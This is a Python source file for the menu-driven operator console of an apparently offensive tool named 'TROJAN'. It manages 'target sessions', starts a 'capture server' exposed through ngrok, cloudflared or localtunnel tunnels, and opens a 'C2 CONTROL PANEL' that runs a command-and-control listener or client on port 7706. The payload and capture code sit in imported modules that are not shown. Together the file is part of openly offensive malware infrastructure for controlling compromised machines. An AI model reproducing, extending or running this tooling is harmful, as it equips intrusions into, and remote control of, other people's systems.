from helper.C2 import C2Server
from helper.session import Session
import os
import sys
import subprocess
import time
import traceback


class main(Session):
    def __init__(self):
        super().__init__()
        self.print_banner()
        while True:
            self.options()
            selected = input("Enter option: ").strip()
            self.run(selected)

    def print_banner(self) -> None:
        print(
            """
        ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗
        ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║
            ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║
            ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║
            ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║
            ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
            by Zohaib Ud Din
            """
        )

    def options(self):
        options = {
            "0":"Exit",
            "1": "List of targets sessions",
            "2": "Refresh targets sessions list",
            "3": "Create new target session",
        }
        print("select option: ")
        for key, value in options.items():
            print(f"{key}: {value}")

    def run(self, selected: str) -> None:
        if selected == "0":
            self.exit()
            return

        if selected == "1":
            sessions = self.getSessions()
            if not sessions:
                print("No sessions found yet.")
                return

            session_choice = input("Pick session number: ").strip()
            session_data = self.loadSession(session_choice)
            if not session_data:
                print("Invalid session selection.")
                return

            # session files are stored as a list of entries; use the latest entry
            self.start(session_data[-1])
            return

        if selected == "2":
            # refresh list
            self.sessions = {}
            sessions = self.getSessions()
            if not sessions:
                print("No sessions found yet.")
            return

        if selected == "3":
            print("Select tunnel provider:")
            print("1) ngrok")
            print("2) cloudflared")
            print("3) localtunnel")
            tunnel_choice = input("type 1, 2 or 3: ").strip()

            tunnel_map = {
                "1": "ngrok",
                "2": "cloudflared",
                "3": "localtunnel",
            }
            tunnel_provider = tunnel_map.get(tunnel_choice)
            if not tunnel_provider:
                print("Invalid tunnel option. Please type 1, 2, or 3.")
                return

            print(f"Starting capture server with {tunnel_provider} tunnel...\n")
            subprocess.run([sys.executable, "app.py", "--tunnel", tunnel_provider], check=False)
            return

        print("Invalid option. Please select 0, 1, 2 or 3.")

    def get_ip(self, session_data):
        ip_options = {
            "0": "Exit",
            "1": f"Localhost ({session_data['local_ip']})",
            "2": f"Public IP ({session_data['ip']})",
            "3": "Use IP 0.0.0.0",
        }
        print("select ip option: ")
        for key, value in ip_options.items():
            print(f"{key}: {value}")
        selected_ipo = input("Enter ip option: ").strip()

        if selected_ipo == "0":
            self.exit()
        elif selected_ipo == "2":
            ip = session_data['ip']
        elif selected_ipo == "1":
            ip = session_data['local_ip']
        elif selected_ipo == "3":
            ip = "0.0.0.0"
        else:
            return self.get_ip(session_data)

        return ip

    def get_port(self):
        options = {
            "0": "Exit",
            "1": "Use default port (7706)",
            "2": "Use custom port",
        }

        print("select port option: ")
        for key, value in options.items():
            print(f"{key}: {value}")
        selected_port = input("Enter port option: ").strip()

        if selected_port == "0":
            self.exit()
        if selected_port == "2":
            port = input("Enter port: ").strip()
        else:
            port = "7706"
        return port

    def start(self, session_data):
        while True:  # Auto-restart loop
            try:
                ip = self.get_ip(session_data)
                port = self.get_port()

                
                options = {
                    "0": "Exit",
                    "1": "Listen C2 server", 
                    "2": "Send C2 server",
                }
                print("\n" + "="*50)
                print("C2 CONTROL PANEL")
                for key, value in options.items():
                    print(f"{key}: {value}")
                print("="*50)

                selected = input("Enter C2 option: ").strip()

                if selected == "0":
                    self.exit()
                    return  # Permanent exit

                elif selected == "1":
                    print(f"\n[*] Starting SERVER on {ip}:{port}")
                    self.c2 = C2Server(ip, port)
                    self.c2.start_server()

                elif selected == "2":
                    print(f"\n[*] Starting CLIENT to {ip}:{port}")
                    self.c2 = C2Server(ip, port)
                    self.c2.start_client()

                else:
                    print("❌ Invalid option! Try again.")
                    continue

            except KeyboardInterrupt:
                print("\n[*] Interrupted - returning to menu...")
                continue
                
            except Exception as e:
                print(f"\n❌ CRITICAL ERROR: {e}")
                print("🔄 Auto-restarting to IP selection...")
                time.sleep(2)
                continue  # Restart from IP selection

    def exit(self):
        print("[!] Exiting...")
        os._exit(0)



if __name__ == "__main__":
    main()